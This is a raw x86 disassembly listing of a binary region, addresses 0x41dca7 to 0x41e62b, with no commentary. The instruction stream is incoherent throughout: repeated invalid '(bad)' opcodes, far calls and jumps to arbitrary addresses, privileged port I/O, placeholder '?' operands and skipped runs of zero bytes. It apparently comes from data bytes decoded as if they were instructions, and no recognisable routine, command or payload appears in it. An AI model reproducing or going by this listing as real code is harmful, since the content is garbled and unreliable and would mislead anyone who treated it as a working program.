  41dca7:	ret    0x6481
  41dcaa:	ja     0x41dd25
  41dcac:	cmp    ecx,DWORD PTR [ecx]
  41dcae:	loop   0x41dcb2
  41dcb0:	ds inc edx
  41dcb2:	arpl   WORD PTR [edi],sp
  41dcb4:	pop    ebx
  41dcb5:	into   
  41dcb6:	retf   0x3c36
  41dcb9:	pop    ecx
  41dcba:	add    bh,dh
  41dcbc:	jmp    esi
  41dcbe:	inc    edi
  41dcbf:	pop    ss
  41dcc0:	int3   
  41dcc1:	aas    
  41dcc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcc3:	sub    al,0x8f
  41dcc5:	jb     0x41dca2
  41dcc7:	sahf   
  41dcc8:	(bad)  
  41dcc9:	push   0x56
  41dccb:	into   
  41dccc:	rol    BYTE PTR [edx+ebx*4],cl
  41dccf:	cdq    
  41dcd0:	stos   DWORD PTR es:[edi],eax
  41dcd1:	jmp    0x41dc9f
  41dcd3:	adc    al,0x7c
  41dcd5:	xlat   BYTE PTR ds:[ebx]
  41dcd6:	out    dx,al
  41dcd7:	(bad)  
  41dcd8:	xor    eax,DWORD PTR [edx+0x41]
  41dcdb:	xchg   BYTE PTR [ecx-0x431fdbe9],bh
  41dce1:	les    esp,FWORD PTR [edx+0x615454b6]
  41dce7:	ret    
  41dce8:	mov    ?,esp
  41dcea:	mov    ebp,0x46c8ed8f
  41dcef:	push   ebx
  41dcf0:	leave  
  41dcf1:	and    dh,BYTE PTR [eax]
  41dcf3:	mov    BYTE PTR [ebx-0x33697a00],cl
  41dcf9:	and    dl,ah
  41dcfb:	sbb    dh,dl
  41dcfd:	push   eax
  41dcfe:	or     bh,dl
  41dd00:	ja     0x41dd0a
  41dd02:	dec    esi
  41dd03:	in     eax,0xe2
  41dd05:	push   cs
  41dd06:	pop    eax
  41dd07:	jnp    0x41dd47
  41dd09:	fwait
  41dd0a:	repz test DWORD PTR [eax],esi
  41dd0d:	xchg   esp,eax
  41dd0e:	scas   eax,DWORD PTR es:[edi]
  41dd0f:	ss xchg edx,eax
  41dd11:	imul   ecx,DWORD PTR [esi+0x35eb45b0],0x1d
  41dd18:	pop    esi
  41dd19:	sar    al,0xae
  41dd1c:	imul   edi,DWORD PTR [esi],0x476bf333
  41dd22:	cli    
  41dd23:	mov    ebx,0x972a809b
  41dd28:	dec    eax
  41dd29:	repz xchg esi,eax
  41dd2b:	mov    eax,0x779e5436
  41dd30:	xor    dh,bh
  41dd32:	nop
  41dd33:	or     ecx,eax
  41dd35:	inc    ecx
  41dd36:	mov    bl,0x24
  41dd38:	sbb    eax,eax
  41dd3a:	xchg   ebx,eax
  41dd3b:	inc    ebx
  41dd3c:	sar    DWORD PTR [edi+0x183c36cd],0x76
  41dd43:	or     BYTE PTR [ecx+0x61f14f5a],dl
  41dd49:	push   edx
  41dd4a:	(bad)  
  41dd4b:	fst    st(3)
  41dd4d:	(bad)  
  41dd4e:	loopne 0x41dcf5
  41dd50:	xchg   eax,edx
  41dd52:	call   0x90e0805a
  41dd57:	fldenv [esi]
  41dd59:	aad    0xf0
  41dd5b:	sub    dh,BYTE PTR [ebx]
  41dd5d:	inc    esi
  41dd5e:	add    eax,eax
  41dd60:	icebp  
  41dd61:	ret    0xc6c8
  41dd64:	mov    edi,0x6a0d57d2
  41dd69:	mov    al,ds:0x29635609
  41dd6e:	hlt    
  41dd6f:	lock adc ebp,DWORD PTR [edi-0x5d]
  41dd73:	int    0x34
  41dd75:	push   eax
  41dd76:	pop    esi
  41dd77:	sbb    ah,BYTE PTR [edi-0x1d]
  41dd7a:	lock adc DWORD PTR [edi],0xffffff9c
  41dd7e:	pop    ebp
  41dd7f:	add    dl,BYTE PTR [ebp+0xf]
  41dd82:	call   0x4667:0x89e0ce9c
  41dd89:	sbb    eax,0x827f0e92
  41dd8e:	test   DWORD PTR [ecx],ebp
  41dd90:	add    DWORD PTR [eax],eax
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	enter  0xe7af,0xc
  41de04:	out    dx,al
  41de05:	cmp    eax,0x1050001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	rol    DWORD PTR [esi],cl
  41de0e:	mov    bh,0xbd
  41de10:	adc    DWORD PTR [edi],esp
  41de12:	les    eax,FWORD PTR [eax]
  41de14:	icebp  
  41de15:	cmp    ebp,DWORD PTR [ecx]
  41de17:	push   edi
  41de18:	inc    ecx
  41de19:	or     eax,0xbc7d02ae
  41de1e:	mov    eax,DWORD PTR [edi]
  41de20:	dec    ecx
  41de21:	inc    eax
  41de22:	fnstenv [edx-0x50]
  41de25:	scas   al,BYTE PTR es:[edi]
  41de26:	mov    ch,bh
  41de28:	push   0xc1c76b31
  41de2d:	in     al,0x38
  41de2f:	xchg   BYTE PTR [ecx-0x22],ch
  41de32:	mov    ah,0xfe
  41de34:	mov    BYTE PTR [eax+0x5e],ch
  41de37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de38:	mov    eax,0x5a116e9c
  41de3d:	xor    bl,BYTE PTR [edx-0x23]
  41de40:	mov    WORD PTR [ebp+ebx*2+0x5baf970f],cs
  41de47:	xor    al,0x53
  41de49:	mov    edx,0x282d2823
  41de4e:	mov    cl,0x1b
  41de50:	(bad)  
  41de51:	mov    ebp,0x1ae8064f
  41de56:	das    
  41de57:	dec    edi
  41de58:	xchg   edi,eax
  41de59:	pop    ss
  41de5a:	xor    DWORD PTR [esi+0x178eed6e],0x54ab285
  41de64:	cmp    al,dl
  41de66:	pop    ds
  41de67:	outs   dx,DWORD PTR ds:[esi]
  41de68:	(bad)  
  41de69:	out    dx,eax
  41de6a:	scas   eax,DWORD PTR es:[edi]
  41de6b:	mov    ss,WORD PTR [ebp+0x6153f197]
  41de71:	sahf   
  41de72:	pop    ecx
  41de73:	ret    
  41de74:	dec    eax
  41de75:	in     al,dx
  41de76:	xchg   esp,eax
  41de77:	xchg   ebx,eax
  41de78:	aaa    
  41de79:	mov    edx,DWORD PTR [eax-0xa69c0c1]
  41de7f:	out    0xa4,eax
  41de81:	jae    0x41de46
  41de83:	or     al,0xff
  41de85:	fwait
  41de86:	xchg   esi,eax
  41de87:	pop    edi
  41de88:	lods   al,BYTE PTR ds:[esi]
  41de89:	inc    ecx
  41de8a:	sbb    DWORD PTR [esi-0x4b377ef1],0x6
  41de91:	sub    BYTE PTR [edx+0x77],0x1e
  41de95:	pop    esp
  41de96:	dec    eax
  41de97:	pop    esp
  41de98:	mov    dl,0xfe
  41de9a:	adc    edi,DWORD PTR [edi+edi*1]
  41de9d:	xchg   DWORD PTR ds:0xd1865810,ebp
  41dea3:	out    dx,al
  41dea4:	adc    eax,DWORD PTR [eax+eax*1+0x78]
  41dea8:	dec    eax
  41dea9:	add    eax,0xea9b3461
  41deae:	cmp    ch,0x57
  41deb1:	xchg   BYTE PTR [eax-0x566a4dd4],ch
  41deb7:	jae    0x41de7b
  41deb9:	daa    
  41deba:	pop    ebp
  41debb:	bound  ebp,QWORD PTR [ebx-0x77]
  41debe:	repz cmp edi,DWORD PTR [edi-0x3d]
  41dec2:	lahf   
  41dec3:	jmp    0xa220:0xb67fa140
  41deca:	pop    edx
  41decb:	mov    edi,0x564864cc
  41ded0:	mov    es,WORD PTR [eax+0x5c]
  41ded3:	gs sub ah,cl
  41ded6:	not    esp
  41ded8:	aad    0xfd
  41deda:	jge    0x41de6d
  41dedc:	adc    edx,DWORD PTR [edi+0x1a]
  41dedf:	neg    BYTE PTR [edx+0x51]
  41dee2:	jns    0x41de9d
  41dee4:	dec    eax
  41dee5:	xchg   BYTE PTR [esi-0x7c],bh
  41dee8:	sub    edi,ecx
  41deea:	call   0xa701c277
  41deef:	imul   esp,DWORD PTR [esi-0x1c],0x77
  41def3:	mov    edx,DWORD PTR [eax-0x3d]
  41def6:	stos   BYTE PTR es:[edi],al
  41def7:	ins    DWORD PTR es:[edi],dx
  41def8:	call   0x5d50:0xf168a92
  41deff:	ja     0x41deb0
  41df01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df02:	in     al,0x18
  41df04:	push   ebx
  41df05:	and    al,0xc8
  41df07:	push   esp
  41df08:	stc    
  41df09:	mov    ah,0xdc
  41df0b:	lods   al,BYTE PTR ds:[esi]
  41df0c:	outs   dx,WORD PTR ds:[esi]
  41df0e:	ror    BYTE PTR ds:0x6e,0x0
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x74569ce9
  41df82:	pop    es
  41df83:	and    al,0xf3
  41df85:	add    DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x6b000001
  41df8d:	jnp    0x41e009
  41df8f:	cmp    cl,ch
  41df91:	int    0x7c
  41df93:	adc    BYTE PTR [eax],0xa7
  41df96:	gs mov dl,0x74
  41df99:	(bad)  
  41df9b:	addr16 adc eax,0x97b93705
  41dfa1:	(bad)  
  41dfa2:	sbb    al,0xc4
  41dfa4:	inc    esi
  41dfa5:	cdq    
  41dfa6:	(bad)  
  41dfa7:	mov    edx,0xe724293c
  41dfac:	mov    edi,DWORD PTR [eax+0x5c]
  41dfaf:	cmp    eax,0x3731f27d
  41dfb4:	inc    ecx
  41dfb5:	test   edx,edx
  41dfb7:	add    edx,ebp
  41dfb9:	(bad)  
  41dfba:	cmp    BYTE PTR [esi],cl
  41dfbc:	mov    edx,0xdeb289f7
  41dfc1:	jnp    0x41dfa3
  41dfc3:	leavew 
  41dfc5:	inc    edi
  41dfc6:	xor    DWORD PTR [esi+0x34],eax
  41dfc9:	push   ecx
  41dfca:	jae    0x41e000
  41dfcc:	pop    esp
  41dfcd:	ins    BYTE PTR es:[edi],dx
  41dfce:	shl    DWORD PTR [eax-0x69b8a0c5],1
  41dfd4:	ins    DWORD PTR es:[edi],dx
  41dfd5:	adc    BYTE PTR [edi],ch
  41dfd7:	or     ebx,edi
  41dfd9:	in     al,0x1c
  41dfdb:	dec    esp
  41dfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfdd:	xchg   ebp,eax
  41dfde:	clc    
  41dfdf:	jmp    DWORD PTR [edi+0x1a8760a3]
  41dfe5:	fild   DWORD PTR [ebp+0x6d0145d9]
  41dfeb:	add    eax,0xb39ed738
  41dff0:	mov    eax,ds:0xa537b01d
  41dff5:	push   esi
  41dff6:	nop
  41dff7:	ins    DWORD PTR es:[edi],dx
  41dff8:	idiv   bh
  41dffa:	retf   0xbb7
  41dffd:	mov    ecx,DWORD PTR ds:0xc4cf0fa4
  41e003:	dec    eax
  41e004:	pop    edx
  41e005:	jge    0x41dfda
  41e007:	jbe    0x41dfed
  41e009:	shl    dh,0x1a
  41e00c:	(bad)  
  41e00d:	mov    es,WORD PTR [edi+eiz*2]
  41e010:	and    ecx,ecx
  41e012:	aaa    
  41e013:	outs   dx,DWORD PTR ds:[esi]
  41e014:	adc    edi,ebp
  41e016:	adc    DWORD PTR [edx],0x7
  41e019:	or     al,BYTE PTR [eax+0x123a3082]
  41e01f:	add    dl,BYTE PTR [eax*4+0x4b504843]
  41e026:	stos   BYTE PTR es:[edi],al
  41e027:	add    edi,DWORD PTR [ebx+0x6]
  41e02a:	scas   al,BYTE PTR es:[edi]
  41e02b:	push   ebp
  41e02c:	call   0x5b57f77
  41e031:	adc    al,0x53
  41e033:	mov    WORD PTR [ecx-0x5facfff1],ds
  41e039:	(bad)  
  41e03a:	mov    ah,0x35
  41e03c:	sub    DWORD PTR [ecx+0x8],ebx
  41e03f:	jb     0x41e04b
  41e041:	cmc    
  41e042:	lds    edx,FWORD PTR [edi+0x2e]
  41e045:	sahf   
  41e046:	and    BYTE PTR [ebx],ah
  41e048:	push   bp
  41e04a:	xlat   BYTE PTR ds:[ebx]
  41e04b:	(bad)  
  41e04c:	xchg   edx,eax
  41e04d:	daa    
  41e04e:	sbb    eax,0x84072a0e
  41e053:	(bad)  
  41e055:	les    eax,FWORD PTR [eax+0x163d5c5e]
  41e05b:	nop
  41e05c:	inc    esp
  41e05d:	cmp    eax,0xbcdb8eb5
  41e062:	(bad)  
  41e063:	jmp    0x6669989b
  41e068:	or     dl,BYTE PTR [esi+0x34]
  41e06b:	sub    BYTE PTR [ecx+0x68],0xc
  41e06f:	adc    al,0xd7
  41e071:	mov    ebx,0x3febc5b
  41e076:	sub    edi,DWORD PTR [esi]
  41e078:	or     DWORD PTR [ecx+0x299556ac],eax
  41e07e:	pop    ebx
  41e07f:	popa   
  41e080:	mov    esp,0xe23038d8
  41e085:	sub    al,0xb0
  41e087:	and    al,0x71
  41e089:	jle    0x41e103
  41e08b:	(bad)  
  41e08c:	retf   
  41e08d:	jp     0x41e03d
  41e08f:	test   al,0x5a
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	pop    ss
  41e101:	gs in  al,dx
  41e103:	and    edi,eax
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0x2e000001
  41e10d:	je     0x41e0c4
  41e10f:	push   ebx
  41e110:	add    al,0x29
  41e112:	mov    ds:0x7c2dc260,eax
  41e117:	xchg   edx,eax
  41e118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e119:	push   esi
  41e11a:	jbe    0x41e0b9
  41e11c:	inc    edx
  41e11d:	adc    al,0xaa
  41e11f:	retf   
  41e120:	push   ebp
  41e121:	cs popf 
  41e123:	imul   ecx,DWORD PTR [ebx],0x1fe2d5f9
  41e129:	arpl   cx,sp
  41e12b:	cmp    BYTE PTR [ebx-0x79874ee8],bh
  41e131:	sub    al,0x5
  41e133:	pop    esi
  41e134:	test   al,0xdf
  41e136:	sahf   
  41e137:	gs pop eax
  41e139:	imul   edi,esp,0x3
  41e13c:	stos   DWORD PTR es:[edi],eax
  41e13d:	cmp    DWORD PTR [eax+0x4d],edi
  41e140:	mov    al,ds:0x1d0cf68c
  41e145:	dec    ebx
  41e146:	jmp    0x94eb8b6e
  41e14b:	mov    dh,0x1e
  41e14d:	pop    esi
  41e14e:	pop    esp
  41e14f:	xor    BYTE PTR [edi-0x19],bl
  41e152:	add    bl,ah
  41e154:	cmc    
  41e155:	and    BYTE PTR [edx+0x41],dl
  41e158:	jbe    0x41e104
  41e15a:	outs   dx,DWORD PTR ds:[esi]
  41e15b:	(bad)  
  41e15d:	test   DWORD PTR [esi],0xf27dc3cc
  41e163:	and    BYTE PTR [ebp+0x6a3cf29e],dh
  41e169:	test   esi,eax
  41e16b:	mov    bl,bl
  41e16d:	in     eax,0x15
  41e16f:	xor    eax,DWORD PTR [edx+0x41b7f14d]
  41e175:	outs   dx,DWORD PTR ds:[esi]
  41e176:	mov    al,ds:0xf5182b5a
  41e17b:	outs   dx,DWORD PTR ds:[esi]
  41e17c:	inc    DWORD PTR [esi]
  41e17e:	mov    ch,BYTE PTR ds:0x799fb865
  41e184:	push   eax
  41e185:	xlat   BYTE PTR fs:[ebx]
  41e187:	pop    esi
  41e188:	xchg   ebx,eax
  41e189:	pop    es
  41e18a:	outs   dx,DWORD PTR ds:[esi]
  41e18b:	loope  0x41e129
  41e18d:	cs enter 0x7712,0xf
  41e192:	pushf  
  41e193:	pop    ds
  41e194:	scas   al,BYTE PTR es:[edi]
  41e195:	dec    ebp
  41e196:	je     0x41e134
  41e198:	pop    ds
  41e199:	pop    ebx
  41e19a:	cmp    BYTE PTR [edx],al
  41e19c:	mov    esi,0x60f2b0d9
  41e1a1:	repz sub DWORD PTR [eax],esp
  41e1a4:	lahf   
  41e1a5:	popf   
  41e1a6:	std    
  41e1a7:	sar    BYTE PTR [esp+edx*1],1
  41e1aa:	jge    0x41e199
  41e1ac:	cmp    DWORD PTR [edx+0x367cbb43],ecx
  41e1b2:	daa    
  41e1b3:	inc    ecx
  41e1b4:	ret    0xa8e1
  41e1b7:	jg     0x41e210
  41e1b9:	add    al,0x9d
  41e1bb:	mov    eax,0xc2c2c78c
  41e1c0:	sti    
  41e1c1:	aas    
  41e1c2:	xchg   esp,eax
  41e1c3:	pop    edi
  41e1c4:	lods   eax,DWORD PTR ds:[esi]
  41e1c5:	in     al,dx
  41e1c6:	push   cs
  41e1c7:	push   esi
  41e1c8:	cmp    eax,0x47448d73
  41e1cd:	jae    0x41e167
  41e1cf:	retf   0xc357
  41e1d2:	push   cs
  41e1d3:	in     eax,0x42
  41e1d5:	sbb    bh,al
  41e1d7:	xchg   edx,eax
  41e1d8:	xor    ah,dh
  41e1da:	cmp    dl,ch
  41e1dc:	mov    ah,0xd8
  41e1de:	aaa    
  41e1df:	mov    dh,ch
  41e1e1:	retf   0x5433
  41e1e4:	fimul  WORD PTR [edx]
  41e1e6:	mov    WORD PTR [eax+eax*4],ds
  41e1e9:	sub    BYTE PTR [edx],al
  41e1eb:	push   cs
  41e1ec:	js     0x41e22b
  41e1ee:	scas   al,BYTE PTR es:[edi]
  41e1ef:	push   eax
  41e1f0:	imul   esi,esp,0x70eb9102
  41e1f6:	inc    ebp
  41e1f7:	xor    al,0xac
  41e1f9:	pop    ss
  41e1fa:	jl     0x41e188
  41e1fc:	test   DWORD PTR [edx-0x56],ebx
  41e1ff:	aad    0xc7
  41e201:	inc    eax
  41e202:	sbb    al,0x25
  41e204:	(bad)
  41e207:	or     DWORD PTR [esi+0x9],esp
  41e20a:	(bad)  
  41e20b:	jmp    0xb5:0xd3f13b13
	...
  41e272:	add    BYTE PTR [eax],al
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0xa6
  41e281:	add    BYTE PTR [ebp+ecx*4-0x3],dh
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x5a000001
  41e28d:	cmp    ch,dl
  41e28f:	inc    BYTE PTR [ebx+0x16]
  41e292:	or     ebp,0xadded32f
  41e298:	and    bh,BYTE PTR [edx+edx*8-0x77ca31a2]
  41e29f:	inc    ebp
  41e2a0:	push   ecx
  41e2a1:	xor    dh,BYTE PTR [esi-0x67]
  41e2a4:	fs popa 
  41e2a6:	inc    esp
  41e2a7:	in     eax,0x4d
  41e2a9:	adc    al,0x4c
  41e2ab:	sbb    al,0x1e
  41e2ad:	mov    ch,0xef
  41e2af:	and    eax,0xed92f97e
  41e2b4:	adc    BYTE PTR [ebx-0x7f],dl
  41e2b7:	push   eax
  41e2b8:	cmp    al,0xef
  41e2ba:	or     al,0xd
  41e2bc:	ja     0x41e25b
  41e2be:	inc    esp
  41e2bf:	jo     0x41e283
  41e2c1:	or     BYTE PTR [edx+0x51],0x29
  41e2c5:	lods   eax,DWORD PTR ds:[esi]
  41e2c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c7:	sbb    edi,ebx
  41e2c9:	inc    edi
  41e2ca:	es cmc 
  41e2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2cd:	sub    eax,0x5a17bcee
  41e2d2:	aad    0x30
  41e2d4:	cmp    al,0x15
  41e2d6:	clc    
  41e2d7:	xchg   esi,eax
  41e2d8:	dec    edx
  41e2d9:	mov    fs,ecx
  41e2db:	mov    ah,0xf
  41e2dd:	push   ss
  41e2de:	outs   dx,DWORD PTR ds:[esi]
  41e2df:	sbb    DWORD PTR [edi+0x32dc5f0c],eax
  41e2e5:	jno    0x41e27c
  41e2e7:	xchg   ebx,eax
  41e2e8:	lods   al,BYTE PTR ds:[esi]
  41e2e9:	addr16 imul ebx,esi,0x47f37e8e
  41e2f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2f1:	shl    BYTE PTR [edx-0x7f],cl
  41e2f4:	lock test cx,0x5913
  41e2fa:	es sub dh,dl
  41e2fd:	adc    eax,0xd1294fa6
  41e302:	es push ss
  41e304:	mov    al,ds:0xe6e377dc
  41e309:	mov    BYTE PTR [ebp+0x31],dh
  41e30c:	mov    esp,0xb8282ccd
  41e311:	(bad)  
  41e312:	xlat   BYTE PTR ds:[ebx]
  41e313:	retf   
  41e314:	or     DWORD PTR [eax+0x18],0xffffffb0
  41e318:	nop
  41e319:	repz and cl,0xda
  41e31d:	inc    ebp
  41e31e:	rcr    esi,1
  41e320:	xor    bl,BYTE PTR [edi]
  41e322:	adc    BYTE PTR [ecx-0x723c44f5],cl
  41e328:	push   0x5520243e
  41e32d:	xchg   esi,eax
  41e32e:	mov    esp,0xef206c99
  41e333:	clc    
  41e334:	daa    
  41e335:	in     al,0x88
  41e337:	hlt    
  41e338:	dec    esp
  41e339:	jns    0x41e378
  41e33b:	repnz mov eax,ds:0x3f51f225
  41e341:	pop    eax
  41e342:	sbb    DWORD PTR [ecx+ecx*1-0x741e55cd],esp
  41e349:	jmp    0xc2718352
  41e34e:	popa   
  41e34f:	test   DWORD PTR [eax+edi*8-0x701a84e9],esp
  41e356:	repz jecxz 0x41e3d4
  41e359:	jg     0x41e30c
  41e35b:	jle    0x41e3a0
  41e35d:	repz (bad) 
  41e360:	gs dec eax
  41e362:	lods   eax,DWORD PTR ds:[esi]
  41e363:	jle    0x41e38a
  41e365:	std    
  41e366:	in     al,dx
  41e367:	mov    dh,0xd5
  41e369:	(bad)  
  41e36a:	int    0xa5
  41e36c:	aam    0x46
  41e36e:	cmp    al,0xb0
  41e370:	iret   
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	add    BYTE PTR [edx-0x9],al
  41e375:	ds mov ch,0xb8
  41e378:	pop    es
  41e379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e37a:	jno    0x41e34a
  41e37c:	and    eax,0xbdd09a7d
  41e381:	pop    esi
  41e382:	add    bh,BYTE PTR [eax]
  41e384:	fsubrp st(2),st
  41e386:	aam    0x67
  41e388:	mov    esi,DWORD PTR [ecx+0x38]
  41e38b:	sbb    DWORD PTR [edi],esi
  41e38d:	es jge 0x41e32f
  41e390:	cli    
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x2e74d709
  41e403:	mov    al,0x2
  41e405:	inc    edx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    eax,0x86000001
  41e40d:	push   es
  41e40e:	push   ecx
  41e40f:	adc    bh,BYTE PTR [ebp-0x61]
  41e412:	jle    0x41e404
  41e414:	sub    cl,ah
  41e416:	inc    BYTE PTR [ebx-0x7982b7c8]
  41e41c:	add    DWORD PTR [eax],eax
  41e41e:	mov    BYTE PTR [edx+0x5945167e],ah
  41e424:	jmp    0x41e406
  41e426:	arpl   WORD PTR [edx+0x5e],si
  41e429:	jno    0x41e4a9
  41e42b:	pop    bp
  41e42d:	push   ecx
  41e42e:	retf   0x4bbd
  41e431:	test   BYTE PTR [ebx+0x41],0xb6
  41e435:	mov    ?,eax
  41e437:	jne    0x41e4a7
  41e439:	aaa    
  41e43a:	fnstsw WORD PTR [eax+eax*1-0x2bb0db5e]
  41e441:	(bad)  
  41e442:	mul    esp
  41e444:	xchg   ecx,eax
  41e445:	add    ebx,esp
  41e447:	rcl    DWORD PTR [ebx-0x3],cl
  41e44a:	test   eax,0xf1a280b9
  41e44f:	aaa    
  41e450:	push   0xbc5f0ffc
  41e455:	mov    ds:0x89779fa9,eax
  41e45a:	dec    eax
  41e45b:	mov    esi,0x33be7f9a
  41e460:	inc    edx
  41e461:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e463:	sti    
  41e464:	(bad)  
  41e465:	push   0xffffffea
  41e467:	or     bl,BYTE PTR [eax+0x16cc42c4]
  41e46d:	inc    ebp
  41e46e:	popa   
  41e46f:	push   ss
  41e470:	xor    BYTE PTR [esi-0x79],bh
  41e473:	test   DWORD PTR [eax],edi
  41e475:	jecxz  0x41e4b7
  41e477:	push   eax
  41e478:	mov    edx,0xdcc43390
  41e47d:	sub    al,0xc8
  41e47f:	ror    eax,1
  41e481:	stc    
  41e482:	out    0xaa,eax
  41e484:	movntps XMMWORD PTR [esi],xmm7
  41e487:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e489:	stos   BYTE PTR es:[edi],al
  41e48a:	test   esi,eax
  41e48c:	add    DWORD PTR ds:0x29b17da,ebx
  41e492:	outs   dx,DWORD PTR ds:[esi]
  41e493:	(bad)  
  41e494:	(bad)  
  41e496:	adc    al,0x97
  41e498:	sbb    DWORD PTR [ebx-0xe21db0e],edx
  41e49e:	ins    DWORD PTR es:[edi],dx
  41e49f:	sahf   
  41e4a0:	adc    al,0x13
  41e4a2:	call   0xc1fe:0x2b351147
  41e4a9:	jnp    0x41e440
  41e4ab:	push   ds
  41e4ac:	cmp    DWORD PTR [edi-0x6471e2a6],edx
  41e4b2:	inc    edx
  41e4b3:	xchg   ebx,eax
  41e4b4:	xor    al,0x25
  41e4b6:	sub    BYTE PTR [esi-0x1b0da87b],0x26
  41e4bd:	xchg   BYTE PTR [esi-0x19],cl
  41e4c0:	leave  
  41e4c1:	xor    DWORD PTR [ebx+0x4cfbf0a2],esp
  41e4c7:	push   ecx
  41e4c8:	rcl    BYTE PTR [esi-0x57],0xf1
  41e4cc:	or     ebp,DWORD PTR [ebp+0x42a3ba9e]
  41e4d2:	in     eax,0x7d
  41e4d4:	mov    edx,0xcc93ca1b
  41e4d9:	inc    edx
  41e4da:	js     0x41e51c
  41e4dc:	shr    DWORD PTR [edx+0x38],cl
  41e4df:	pop    ecx
  41e4e0:	pop    ebp
  41e4e1:	pop    ds
  41e4e2:	out    dx,eax
  41e4e3:	(bad)  
  41e4e5:	repnz xchg esp,eax
  41e4e7:	xlat   BYTE PTR ds:[ebx]
  41e4e8:	add    edi,DWORD PTR [edi]
  41e4ea:	jge    0x41e479
  41e4ec:	scas   al,BYTE PTR es:[edi]
  41e4ed:	into   
  41e4ee:	cli    
  41e4ef:	dec    ebx
  41e4f0:	push   esi
  41e4f1:	dec    edx
  41e4f2:	sub    ch,0x2a
  41e4f5:	mov    ecx,?
  41e4f7:	stos   BYTE PTR es:[edi],al
  41e4f8:	mov    edi,DWORD PTR [ecx-0x67e105fa]
  41e4fe:	in     al,dx
  41e4ff:	mov    ds:0x2e46788b,eax
  41e504:	jg     0x41e55e
  41e506:	stc    
  41e507:	push   eax
  41e508:	fisttp DWORD PTR [esi]
  41e50a:	push   eax
  41e50b:	ss ret 0x96e9
  41e50f:	and    DWORD PTR [ecx+0x0],esp
	...
  41e572:	add    BYTE PTR [eax],al
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5ac
  41e581:	bound  esp,QWORD PTR [eax+0x143072c]
  41e587:	add    BYTE PTR ds:0x84000001,al
  41e58d:	push   ecx
  41e58e:	sbb    ch,ah
  41e590:	inc    edi
  41e591:	inc    ebx
  41e592:	ret    
  41e593:	xchg   ecx,eax
  41e594:	inc    ebp
  41e595:	add    BYTE PTR [edx],bh
  41e597:	loope  0x41e56d
  41e599:	retf   0x1376
  41e59c:	mov    edx,0xbcff88ec
  41e5a1:	and    DWORD PTR [edx+0x53],esp
  41e5a4:	fsub   st(2),st
  41e5a6:	xchg   cl,cl
  41e5a8:	inc    ebx
  41e5a9:	fild   WORD PTR [edi+0x2099c52f]
  41e5af:	inc    edx
  41e5b0:	(bad)  
  41e5b1:	add    eax,0x98d259a1
  41e5b6:	mov    edx,0x8035f956
  41e5bb:	fs dec ebx
  41e5bd:	mov    bl,0xf0
  41e5bf:	jb     0x41e5e7
  41e5c1:	cwde   
  41e5c2:	fnstcw WORD PTR [ebx-0x14abaec9]
  41e5c8:	mov    edx,0x2ea15cf6
  41e5cd:	imul   eax,DWORD PTR [ebx+0x51d948ad],0xffffffee
  41e5d4:	jge    0x41e59c
  41e5d6:	xor    al,0x8e
  41e5d8:	push   ecx
  41e5d9:	xor    BYTE PTR [ebp+0x456b7950],dl
  41e5df:	pop    ds
  41e5e0:	in     al,0xd6
  41e5e2:	cmp    BYTE PTR [edx-0x122e6369],bh
  41e5e8:	call   0x9514da75
  41e5ed:	mov    cs,WORD PTR [ebp*8+0x5c425c06]
  41e5f4:	ds pop ss
  41e5f6:	cli    
  41e5f7:	mov    esp,0xa889fda1
  41e5fc:	and    DWORD PTR [edx+0x5986f53e],ebx
  41e602:	push   ss
  41e603:	cmp    DWORD PTR [edx+0xb],ecx
  41e606:	xchg   edx,eax
  41e607:	add    eax,0x88cfcbc4
  41e60c:	or     al,0x9a
  41e60e:	jbe    0x41e594
  41e610:	bound  ebx,QWORD PTR [esi+esi*8-0x5e58965]
  41e617:	data16 cs loope 0x41e5b9
  41e61b:	loopne 0x41e636
  41e61d:	dec    edx
  41e61e:	daa    
  41e61f:	mov    bh,0x51
  41e621:	std    
  41e622:	and    al,0xf5
  41e624:	and    eax,0xf826ddf0
  41e629:	mov    ebx,DWORD PTR [esi]
  41e62b:	lods   al,BYTE PTR ds:[esi]
